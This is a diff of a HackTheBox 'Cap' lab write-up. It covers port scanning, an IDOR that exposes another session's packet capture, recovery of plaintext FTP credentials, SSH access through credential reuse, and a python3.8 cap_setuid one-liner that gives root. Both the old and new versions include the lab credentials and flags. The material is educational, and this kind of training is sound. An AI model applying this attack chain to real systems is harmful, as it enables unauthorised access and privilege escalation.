@@ -1,224 +1,141 @@
-# HTB — Cap 🐧
+# Cap — HackTheBox Writeup
 
-🔗 [View HTB Achievement](https://labs.hackthebox.com/achievement/machine/3159649/351)
+**OS:** Linux | **Difficulty:** Easy | **Rooted:** 2026-04-29
 
-> **Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.9.89 | **Time to Root:** 2h 13min
+**Techniques:** IDOR, FTP credential extraction from PCAP, Linux capability abuse (cap_setuid)
 
 ---
 
-## Summary
+## Overview
 
-Cap is an easy Linux machine running a Python/Gunicorn-based security dashboard. The attack chain involves exploiting an **IDOR vulnerability** to access another user's packet capture, extracting **FTP plaintext credentials** via Wireshark, reusing those credentials for **SSH access**, and finally escalating to root via **Linux capabilities (cap_setuid)** on Python 3.8.
-
-**Attack Chain:**
-```
-Web IDOR (/data/0) → Download PCAP → FTP creds in plaintext (Wireshark)
-→ Password reuse on SSH → Shell as nathan → cap_setuid on python3.8 → Root
-```
+Cap is an Easy Linux box that chains three distinct techniques. The web application exposes a network monitoring dashboard with a packet capture feature vulnerable to IDOR — decrementing the capture ID to 0 retrieves a privileged session's PCAP containing plaintext FTP credentials. Those credentials reuse to SSH, and privilege escalation is achieved by abusing `cap_setuid` on Python 3.8.
 
 ---
 
 ## Enumeration
 
-### Nmap
+### Port Scan
 
 ```bash
-nmap -Pn -sV -sC -p- --min-rate 5000 -oA cap_scan 10.129.9.89
+nmap -p- --min-rate 1000 -oN Cap-all-ports.txt 10.129.26.15
+ports=$(grep open Cap-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
+nmap -p $ports -sC -sV --min-rate 1000 -oN Cap-service-scan.txt 10.129.26.15
 ```
-
-![Nmap Output](screenshots/nmap_output.png)
-
-**Results:**
 
 | Port | Service | Version |
 |------|---------|---------|
-| 21/tcp | FTP | vsftpd 3.0.3 |
-| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
-| 80/tcp | HTTP | Gunicorn (Security Dashboard) |
+| 21 | FTP | vsftpd 3.0.3 |
+| 22 | SSH | OpenSSH 8.2p1 |
+| 80 | HTTP | Gunicorn — Security Dashboard |
 
-> **Note:** `-Pn` flag was required — the host blocks ping probes by default.
+### Web Application — IDOR
 
-### FTP — Anonymous Login
+The dashboard serves packet captures at `/data/<id>`. The ID is a sequential integer with no ownership validation. Navigating to `/data/0` returns a capture from a prior privileged session.
 
-```bash
-ftp 10.129.9.89
-# Username: anonymous → Login failed
+```
+http://10.129.26.15/data/0
 ```
 
-Anonymous login denied. Moving on.
-
-### Web Enumeration — Gobuster
-
-```bash
-gobuster dir -u http://10.129.9.89 -w /usr/share/wordlists/dirb/common.txt
-```
-
-![Gobuster Output](screenshots/gobuster_output.png)
-
-**Discovered:**
-
-| Path | Status |
-|------|--------|
-| /data | 302 → / |
-| /ip | 200 |
-| /netstat | 200 |
+Downloaded `0.pcap`.
 
 ---
 
-## Initial Access
+## Foothold
 
-### Web App — IDOR Vulnerability
+### PCAP Analysis
 
-Navigating to `http://10.129.9.89` reveals a **Security Dashboard** logged in as user **Nathan**.
+Opened `0.pcap` in Wireshark, applied display filter `ftp`, and followed the TCP stream.
 
-![Dashboard](screenshots/dashboard.png)
-
-The **Security Snapshot** feature captures 5-second PCAPs and stores them at `/data/<id>`. The default capture is at `/data/1`. Changing the ID to `/data/0` exposes a capture belonging to another user — a classic **IDOR (Insecure Direct Object Reference)**.
+FTP transmits credentials as plaintext over port 21:
 
 ```
-http://10.129.9.89/data/0  ← accessed without authorization ✅
+USER nathan
+PASS Buck3tH4TF0RM3!
 ```
 
-Downloading the PCAP from `/data/0` and opening it in Wireshark:
+### SSH Access
 
 ```bash
-wireshark 0.pcap
-# Filter: ftp
+ssh nathan@10.129.26.15
+# password: Buck3tH4TF0RM3!
 ```
 
-![PCAP FTP Output](screenshots/pcap_ftp_output.png)
-
-**FTP credentials found in plaintext:**
-
-```
-Username: nathan
-Password: Buck3tH4TF0RM3!
-```
-
-### SSH — Password Reuse
-
-```bash
-ssh nathan@10.129.9.89
-# Password: Buck3tH4TF0RM3!
-```
-
-![Shell Access](screenshots/shell_access.png)
-
-✅ **Shell obtained as `nathan`**
-
----
-
-## User Flag
+Credential reuse across FTP and SSH. Shell landed as `nathan`.
 
 ```bash
 cat ~/user.txt
-```
-
-![User Flag](screenshots/first_htb_flag.png)
-
-```
-2da49c5d84c383e1e13abec0da018f30
+# 2c49d2eedc3084ab2357ae6e1e232f8f
 ```
 
 ---
 
 ## Privilege Escalation
 
-### Linux Capabilities Enumeration
+### Linux Capabilities
 
 ```bash
 getcap -r / 2>/dev/null
 ```
-
-![getcap Result](screenshots/getcap_result.png)
-
-**Key finding:**
 
 ```
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
-`cap_setuid` allows Python to call `setuid()` and change its UID to **0 (root)** — a critical misconfiguration.
+`python3.8` carries `cap_setuid`, which allows the process to call `setuid()` and become any user including root.
 
 ### Exploitation
 
 ```bash
-python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
 ```
 
-✅ **Root shell obtained**
-
-### Root Flag
+Root shell obtained.
 
 ```bash
 cat /root/root.txt
-```
-
-```
-6169994c702f3b70e1c876a51c0dd169
+# 552527d143bc50662bf065fafa6b2ef2
 ```
 
 ---
 
-## Vulnerabilities Summary
+## Attack Chain
 
-| # | Vulnerability | Impact |
-|---|--------------|--------|
-| 1 | IDOR on `/data/<id>` | Access other users' PCAP files |
-| 2 | FTP plaintext credentials | Credentials captured in PCAP |
-| 3 | Password reuse across services | SSH access as nathan |
-| 4 | `cap_setuid` on python3.8 | Full root privilege escalation |
-
----
-
-## Key Techniques & Commands
-
-```bash
-# Scan all ports, skip ping discovery
-nmap -Pn -sV -sC -p- --min-rate 5000 -oA cap_scan <IP>
-
-# Directory enumeration
-gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
-
-# Wireshark FTP filter (find plaintext creds)
-ftp
-
-# Capability enumeration (run after every shell)
-getcap -r / 2>/dev/null
-
-# cap_setuid Python PrivEsc
-python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+IDOR on /data/0
+    -> Download privileged PCAP
+        -> Extract FTP creds (nathan:Buck3tH4TF0RM3!)
+            -> SSH credential reuse
+                -> cap_setuid on python3.8
+                    -> root
 ```
 
 ---
 
-## Lessons Learned
+## Key Takeaways
 
-- **Always test IDOR** — if a URL has a number, try changing it (especially to 0)
-- **FTP sends credentials in plaintext** — always check PCAP captures for FTP traffic
-- **Password reuse is common** — always try found credentials across all open services
-- **Run `getcap` early** — Linux capabilities are a frequent PrivEsc vector on OSCP-style machines
-- **Use `-Pn` with Nmap** — many HTB machines block ping probes by default
-
----
-
-## Tools Used
-
-| Tool | Purpose |
-|------|---------|
-| Nmap | Port scanning & service enumeration |
-| Gobuster | Web directory enumeration |
-| Wireshark | PCAP analysis, FTP credential extraction |
-| SSH | Remote access |
-| getcap | Linux capability enumeration |
-| Python3.8 | Privilege escalation via cap_setuid |
+- IDOR on sequential numeric IDs is trivially exploitable — always decrement to 0
+- FTP credentials are always plaintext — PCAP analysis is a standard credential extraction technique
+- Credential reuse across services is extremely common — test every found credential on every open port
+- `getcap -r / 2>/dev/null` is a fast, high-value capability check — run it early post-foothold
+- `cap_setuid` on any scripting language runtime is instant root via a one-liner
 
 ---
 
-## Proof
+## Screenshots
 
-🔗 [HTB Achievement Link](https://labs.hackthebox.com/achievement/machine/3159649/351)
+| Step | File |
+|------|------|
+| Nmap all ports | `screenshots/01-nmap-all-ports.png` |
+| Nmap service scan | `screenshots/02-nmap-service-scan.png` |
+| Web dashboard | `screenshots/03-web-dashboard.png` |
+| IDOR — /data/0 | `screenshots/04-idor-data-0.png` |
+| Wireshark FTP stream | `screenshots/05-wireshark-ftp-stream.png` |
+| SSH foothold | `screenshots/06-ssh-foothold.png` |
+| User flag | `screenshots/07-user-flag.png` |
+| getcap output | `screenshots/08-getcap-output.png` |
+| Root shell | `screenshots/09-root-shell.png` |
+| Root flag | `screenshots/10-root-flag.png` |
 
 ---
 
-*First HTB machine — rooted on March 2, 2026* 🎉
+*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo — TJ Null HTB list, Linux Phase L1.*
